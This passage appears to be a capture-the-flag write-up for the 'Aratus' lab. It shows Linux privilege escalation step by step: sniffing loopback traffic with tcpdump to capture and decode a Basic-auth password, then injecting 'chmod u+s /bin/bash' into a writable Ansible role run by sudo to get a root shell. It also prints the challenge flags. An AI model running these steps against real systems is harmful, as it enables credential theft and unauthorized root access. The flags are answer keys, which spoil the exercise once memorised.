@@ -417,3 +417,422 @@ drwxr-xr-x.  6 simeon   simeon   86 Nov 23  2021 chapter8
 drwxr-xr-x.  7 simeon   simeon  106 Nov 23  2021 chapter9
 -rw-r--r--.  1 theodore root    251 Jan 10  2022 message-to-simeon.txt
 drwx------.  2 simeon   simeon   29 Jan 10  2022 .ssh
+lrwxrwxrwx.  1 root     root      9 Dec  2  2021 .viminfo -> /dev/null
+[simeon@aratus ~]$ cd ../theodore/
+-bash: cd: ../theodore/: Permission denied
+[simeon@aratus ~]$ cd ../automation/
+-bash: cd: ../automation/: Permission denied
+
+[simeon@aratus ~]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for simeon: 
+Sorry, user simeon may not run sudo on aratus.
+[simeon@aratus ~]$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
+-rws--x--x. 1 root root 23968 Feb  2  2021 /usr/bin/chfn
+-rws--x--x. 1 root root 23880 Feb  2  2021 /usr/bin/chsh
+-rwsr-xr-x. 1 root root 44264 Feb  2  2021 /usr/bin/mount
+-rwsr-xr-x. 1 root root 73888 Aug  9  2019 /usr/bin/chage
+-rwsr-xr-x. 1 root root 78408 Aug  9  2019 /usr/bin/gpasswd
+-rwsr-xr-x. 1 root root 41936 Aug  9  2019 /usr/bin/newgrp
+-rwsr-xr-x. 1 root root 32128 Feb  2  2021 /usr/bin/su
+-rwsr-xr-x. 1 root root 31984 Feb  2  2021 /usr/bin/umount
+---s--x--x. 1 root root 151424 Oct 14  2021 /usr/bin/sudo
+-rwsr-xr-x. 1 root root 27672 Jan 25  2022 /usr/bin/pkexec
+-rwsr-xr-x. 1 root root 57576 Jan 13  2022 /usr/bin/crontab
+-rwsr-xr-x. 1 root root 27856 Apr  1  2020 /usr/bin/passwd
+-rwsr-xr-x. 1 root root 11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+-rwsr-xr-x. 1 root root 36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+-rwsr-xr-x. 1 root root 11296 Nov 16  2020 /usr/sbin/usernetctl
+-rwsr-xr-x. 1 root root 15432 Jan 25  2022 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-x---. 1 root dbus 57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+[simeon@aratus ~]$ getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+
+[simeon@aratus ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 02:00:29:35:6d:53 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.132.119/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2296sec preferred_lft 2296sec
+    inet6 fe80::29ff:fe35:6d53/64 scope link 
+       valid_lft forever preferred_lft forever
+
+- `tcpdump`: This is the command-line utility for capturing and analyzing network packets.
+- `-i lo`: This option specifies the network interface to capture packets from, in this case, the loopback interface ("lo").
+- `-A`: This option tells tcpdump to print each packet's payload (data) in ASCII format, making it human-readable.
+
+[simeon@aratus ~]$ tcpdump -i lo -A
+
+04:53:01.984008 IP localhost.32980 > localhost.http: Flags [.], ack 1, win 683, options [nop,nop,TS val 2812161 ecr 2812161], length 0
+E..4Q
+@.@..............P.r.	.^.0.....(.....
+.*...*..
+04:53:01.984239 IP localhost.32980 > localhost.http: Flags [P.], seq 1:224, ack 1, win 683, options [nop,nop,TS val 2812161 ecr 2812161], length 223: HTTP: GET /test-auth/index.html HTTP/1.1
+E...Q.@.@..............P.r.	.^.0...........
+.*...*..GET /test-auth/index.html HTTP/1.1
+Host: 127.0.0.1
+User-Agent: python-requests/2.14.2
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=
+
+04:53:01.984258 IP localhost.http > localhost.32980: Flags [.], ack 224, win 700, options [nop,nop,TS val 2812161 ecr 2812161], length 0
+E..4@1@.@............P...^.0.r.......(.....
+.*...*..
+04:53:01.984708 IP localhost.http > localhost.32980: Flags [P.], seq 1:428, ack 224, win 700, options [nop,nop,TS val 2812162 ecr 2812161], length 427: HTTP: HTTP/1.1 200 OK
+E...@2@.@............P...^.0.r.............
+.*...*..HTTP/1.1 200 OK
+Date: Sun, 23 Jul 2023 02:53:01 GMT
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+Last-Modified: Tue, 23 Nov 2021 13:08:49 GMT
+ETag: "6d-5d1747131d500"
+Accept-Ranges: bytes
+Content-Length: 109
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>
+<h1>Hello there!</h1>
+<p>If you read this, the curl command was succesful!</p>
+</body>
+</html>
+78 packets captured
+156 packets received by filter
+0 packets dropped by kernel
+
+echo "dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=" | base64 -d
+theodore:Rijyaswahebceibarjik
+
+[simeon@aratus ~]$ su theodore
+Password: 
+[theodore@aratus simeon]$ cd /home/theodore/
+[theodore@aratus ~]$ ls
+scripts  user.txt
+[theodore@aratus ~]$ cat user.txt 
+THM{ba8d3b87bfdb9d10115cbe24feabbc20}
+
+[theodore@aratus scripts]$ cat test-www-auth.py 
+#!/usr/bin/python3
+
+import requests
+
+url = "http://127.0.0.1/test-auth/index.html"
+headers = {"Authorization" : "Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs="}
+
+r = requests.get(url, headers=headers)
+print(r)
+
+[theodore@aratus scripts]$ sudo -l
+Matching Defaults entries for theodore on aratus:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS
+    DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User theodore may run the following commands on aratus:
+    (automation) NOPASSWD: /opt/scripts/infra_as_code.sh
+
+[theodore@aratus scripts]$ cat /opt/scripts/infra_as_code.sh
+#!/bin/bash
+cd /opt/ansible
+/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml
+
+[theodore@aratus scripts]$ cd /opt/ansible/playbooks/
+[theodore@aratus playbooks]$ ls
+firewalld.yaml  httpd.yaml  smbd.yaml  sshd.yaml  vsftpd.yaml
+[theodore@aratus playbooks]$ ls -lah
+total 20K
+drwxr-xr-x. 2 automation automation  99 Nov 23  2021 .
+drwxr-x---. 4 automation theodore    90 Nov 23  2021 ..
+-rw-r--r--. 1 automation automation 156 Nov 23  2021 firewalld.yaml
+-rw-r--r--. 1 automation automation 312 Nov 23  2021 httpd.yaml
+-rw-r--r--. 1 automation automation 140 Nov 23  2021 smbd.yaml
+-rw-r--r--. 1 automation automation 138 Nov 23  2021 sshd.yaml
+-rw-r--r--. 1 automation automation 145 Nov 23  2021 vsftpd.yaml
+[theodore@aratus playbooks]$ cd ..
+[theodore@aratus ansible]$ ls
+ansible.cfg  inventory  playbooks  README.txt  roles
+[theodore@aratus ansible]$ cd roles/
+[theodore@aratus roles]$ ls -lah
+total 0
+drwxr-xr-x. 3 automation automation  32 Nov 23  2021 .
+drwxr-x---. 4 automation theodore    90 Nov 23  2021 ..
+drwxr-xr-x. 9 automation automation 178 Dec  2  2021 geerlingguy.apache
+[theodore@aratus roles]$ cd geerlingguy.apache/
+[theodore@aratus geerlingguy.apache]$ ls -lah
+total 24K
+drwxr-xr-x. 9 automation automation  178 Dec  2  2021 .
+drwxr-xr-x. 3 automation automation   32 Nov 23  2021 ..
+-rw-rw-r--. 1 automation automation   38 Dec  2  2021 .ansible-lint
+drwxr-xr-x. 2 automation automation   22 Dec  2  2021 defaults
+drwxr-xr-x. 2 automation automation   22 Dec  2  2021 handlers
+-rw-rw-r--. 1 automation automation 1.1K Dec  2  2021 LICENSE
+drwxr-xr-x. 2 automation automation   50 Dec  2  2021 meta
+drwxr-xr-x. 3 automation automation   21 Dec  2  2021 molecule
+-rw-rw-r--. 1 automation automation 8.2K Dec  2  2021 README.md
+drwxr-xr-x. 2 automation automation  228 Dec  2  2021 tasks
+drwxr-xr-x. 2 automation automation   28 Dec  2  2021 templates
+drwxr-xr-x. 2 automation automation  142 Dec  2  2021 vars
+-rw-rw-r--. 1 automation automation  121 Dec  2  2021 .yamllint
+[theodore@aratus geerlingguy.apache]$ cd tasks/
+[theodore@aratus tasks]$ ls -lah
+total 36K
+drwxr-xr-x. 2 automation automation  228 Dec  2  2021 .
+drwxr-xr-x. 9 automation automation  178 Dec  2  2021 ..
+-rw-rw-r--. 1 automation automation 1.7K Dec  2  2021 configure-Debian.yml
+-rw-rw-r--+ 1 automation automation 1.1K Dec  2  2021 configure-RedHat.yml
+-rw-rw-r--. 1 automation automation  546 Dec  2  2021 configure-Solaris.yml
+-rw-rw-r--. 1 automation automation  711 Dec  2  2021 configure-Suse.yml
+-rw-rw-r--. 1 automation automation 1.4K Dec  2  2021 main.yml
+-rw-rw-r--. 1 automation automation  193 Dec  2  2021 setup-Debian.yml
+-rw-rw-r--. 1 automation automation  198 Dec  2  2021 setup-RedHat.yml
+-rw-rw-r--. 1 automation automation  134 Dec  2  2021 setup-Solaris.yml
+-rw-rw-r--. 1 automation automation  133 Dec  2  2021 setup-Suse.yml
+
+The plus sign (+) at the end of the file permissions in the listing indicates that the file has extended file attributes associated with it. Extended file attributes are additional metadata that can be attached to a file, providing extra information beyond the basic file permissions.
+
+Extended file attributes are used for various purposes, such as storing file metadata, security-related information, or custom data. They can be used by the system or applications to keep track of additional properties of a file.
+
+In your case, the files "configure-RedHat.yml" has the extended file attributes associated with it, as indicated by the plus sign in the file permissions listing. To view the extended attributes of a file, you can use the `lsattr`
+
+[theodore@aratus tasks]$ lsattr configure-RedHat.yml
+---------------- configure-RedHat.yml
+
+[theodore@aratus tasks]$ cat configure-RedHat.yml
+---
+- name: Configure Apache.
+  lineinfile:
+    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
+    regexp: "{{ item.regexp }}"
+    line: "{{ item.line }}"
+    state: present
+    mode: 0644
+  with_items: "{{ apache_ports_configuration_items }}"
+  notify: restart apache
+
+- name: Check whether certificates defined in vhosts exist.
+  stat: path={{ item.certificate_file }}
+  register: apache_ssl_certificates
+  with_items: "{{ apache_vhosts_ssl }}"
+
+- name: Add apache vhosts configuration.
+  template:
+    src: "{{ apache_vhosts_template }}"
+    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
+    owner: root
+    group: root
+    mode: 0644
+  notify: restart apache
+  when: apache_create_vhosts | bool
+
+- name: Check if localhost cert exists (RHEL 8 and later).
+  stat:
+    path: /etc/pki/tls/certs/localhost.crt
+  register: localhost_cert
+  when: ansible_distribution_major_version | int >= 8
+
+- name: Ensure httpd certs are installed (RHEL 8 and later).
+  command: /usr/libexec/httpd-ssl-gencerts
+  when:
+    - ansible_distribution_major_version | int >= 8
+    - not localhost_cert.stat.exists
+
+[theodore@aratus tasks]$ cat configure-RedHat.yml 
+---
+- name: Configure Apache.
+  lineinfile:
+    dest: "{{ apache_server_root }}/conf/{{ apache_daemon }}.conf"
+    regexp: "{{ item.regexp }}"
+    line: "{{ item.line }}"
+    state: present
+    mode: 0644
+  with_items: "{{ apache_ports_configuration_items }}"
+  notify: restart apache
+
+- name: Check whether certificates defined in vhosts exist.
+  stat: path={{ item.certificate_file }}
+  register: apache_ssl_certificates
+  with_items: "{{ apache_vhosts_ssl }}"
+
+- name: Add apache vhosts configuration.
+  template:
+    src: "{{ apache_vhosts_template }}"
+    dest: "{{ apache_conf_path }}/{{ apache_vhosts_filename }}"
+    owner: root
+    group: root
+    mode: 0644
+  notify: restart apache
+  when: apache_create_vhosts | bool
+
+- name: Check if localhost cert exists (RHEL 8 and later).
+  stat:
+    path: /etc/pki/tls/certs/localhost.crt
+  register: localhost_cert
+  when: ansible_distribution_major_version | int >= 8
+
+- name: Ensure httpd certs are installed (RHEL 8 and later).
+  command: /usr/libexec/httpd-ssl-gencerts
+  when:
+    - ansible_distribution_major_version | int >= 8
+    - not localhost_cert.stat.exists
+- name: root
+  command: sudo chmod u+s /bin/bash
+
+[theodore@aratus tasks]$ sudo -u automation /opt/scripts/infra_as_code.sh
+
+PLAY [Check status of the firewall] **************************************************************************
+
+TASK [Gathering Facts] ***************************************************************************************
+ok: [10.10.132.119]
+
+TASK [check firewalld] ***************************************************************************************
+ok: [10.10.132.119]
+
+PLAY RECAP ***************************************************************************************************
+10.10.132.119              : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
+
+PLAY [Install and configure Apache] **************************************************************************
+
+TASK [Gathering Facts] ***************************************************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Include OS-specific variables.] ***************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Include variables for Amazon Linux.] **********************************************
+skipping: [10.10.132.119]
+
+TASK [geerlingguy.apache : Define apache_packages.] **********************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : include_tasks] ********************************************************************
+included: /opt/ansible/roles/geerlingguy.apache/tasks/setup-RedHat.yml for 10.10.132.119
+
+TASK [geerlingguy.apache : Ensure Apache is installed on RHEL.] **********************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Get installed version of Apache.] *************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Create apache_version variable.] **************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Include Apache 2.2 variables.] ****************************************************
+skipping: [10.10.132.119]
+
+TASK [geerlingguy.apache : Include Apache 2.4 variables.] ****************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Configure Apache.] ****************************************************************
+included: /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml for 10.10.132.119
+
+TASK [geerlingguy.apache : Configure Apache.] ****************************************************************
+ok: [10.10.132.119] => (item={u'regexp': u'^Listen ', u'line': u'Listen 80'})
+
+TASK [geerlingguy.apache : Check whether certificates defined in vhosts exist.] ******************************
+
+TASK [geerlingguy.apache : Add apache vhosts configuration.] *************************************************
+ok: [10.10.132.119]
+
+TASK [geerlingguy.apache : Check if localhost cert exists (RHEL 8 and later).] *******************************
+skipping: [10.10.132.119]
+
+TASK [geerlingguy.apache : Ensure httpd certs are installed (RHEL 8 and later).] *****************************
+skipping: [10.10.132.119]
+
+TASK [geerlingguy.apache : root] *****************************************************************************
+[WARNING]: Consider using 'become', 'become_method', and 'become_user' rather than running sudo
+changed: [10.10.132.119]
+
+TASK [geerlingguy.apache : Ensure Apache has selected state and enabled on boot.] ****************************
+ok: [10.10.132.119]
+
+TASK [configure firewall] ************************************************************************************
+ok: [10.10.132.119] => (item=http)
+ok: [10.10.132.119] => (item=https)
+
+PLAY RECAP ***************************************************************************************************
+10.10.132.119              : ok=16   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   
+
+PLAY [Check the status of SMB] *******************************************************************************
+
+TASK [Gathering Facts] ***************************************************************************************
+ok: [10.10.132.119]
+
+TASK [check smbd] ********************************************************************************************
+ok: [10.10.132.119]
+
+PLAY RECAP ***************************************************************************************************
+10.10.132.119              : ok=18   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   
+
+PLAY [Check status of sshd] **********************************************************************************
+
+TASK [Gathering Facts] ***************************************************************************************
+ok: [10.10.132.119]
+
+TASK [check sshd] ********************************************************************************************
+ok: [10.10.132.119]
+
+PLAY RECAP ***************************************************************************************************
+10.10.132.119              : ok=20   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   
+
+PLAY [Check status of vsftpd] ********************************************************************************
+
+TASK [Gathering Facts] ***************************************************************************************
+ok: [10.10.132.119]
+
+TASK [check vsfptd] ******************************************************************************************
+ok: [10.10.132.119]
+
+PLAY RECAP ***************************************************************************************************
+10.10.132.119              : ok=22   changed=1    unreachable=0    failed=0    skipped=5    rescued=0    ignored=0   
+
+[theodore@aratus tasks]$ ls
+configure-Debian.yml  configure-Solaris.yml  main.yml          setup-RedHat.yml   setup-Suse.yml
+configure-RedHat.yml  configure-Suse.yml     setup-Debian.yml  setup-Solaris.yml
+[theodore@aratus tasks]$ ls -la /bin/bash
+-rwsr-xr-x. 1 root root 964536 Nov 24  2021 /bin/bash
+
+[theodore@aratus tasks]$ bash -p
+bash-4.2# cd /root
+bash-4.2# ls
+anaconda-ks.cfg  root.txt  scripts
+bash-4.2# cat root.txt 
+THM{d8afc85983603342f6c6979b20e06cf6}
+bash-4.2# cd scripts/
+bash-4.2# ls
+get-ip-ansible.sh
+bash-4.2# cat get-ip-ansible.sh 
+#!/bin/bash
+/usr/sbin/ip address show dev eth0 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1 > /opt/ansible/inventory
+```
+- What is the user.txt flag?
+- ***THM{ba8d3b87bfdb9d10115cbe24feabbc20}***
+- What is the root.txt flag?
+- ***THM{d8afc85983603342f6c6979b20e06cf6}***
+
+## Notes / Lessons Learned
+[[Topology]]
+
